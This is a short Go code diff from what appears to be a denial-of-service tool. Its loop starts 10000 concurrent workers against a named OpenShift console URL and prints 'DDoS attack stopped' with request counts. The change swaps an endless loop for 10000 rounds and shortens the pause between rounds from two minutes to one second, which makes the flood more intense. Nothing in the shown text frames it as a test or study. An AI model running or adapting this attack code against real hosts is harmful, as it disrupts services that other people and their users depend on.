@@ -19,7 +19,7 @@ func main() {
 		port = "8080"
 	}
 
-	for {
+	for i := 0; i < 10000; i++ {
 	        fmt.Println("helloooo")
 	        workers := 10000
 		d, err := New("https://console-openshift-console.apps.sandbox-m2.ll9k.p1.openshiftapps.com", workers)
@@ -27,7 +27,7 @@ func main() {
 			panic(err)
 		}
 		d.Run()
-		time.Sleep(time.Minute * 2)
+		time.Sleep(time.Second)
 		d.Stop()
 		successRequest, amountRequests := d.Result()
 		fmt.Println("DDoS attack stopped:", successRequest, amountRequests)
